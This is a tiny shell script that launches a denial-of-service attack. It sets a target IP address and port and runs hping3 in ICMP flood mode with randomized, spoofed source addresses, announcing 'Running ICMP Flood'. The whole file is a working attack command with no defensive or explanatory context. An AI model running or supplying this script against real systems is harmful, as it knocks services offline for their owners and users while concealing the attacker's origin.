#!/bin/sh

IP=20.79.0.2
PORT=80
echo "Running ICMP Flood on $IP:$PORT..."

hping3 -1 --flood -V --rand-source $IP -p $PORT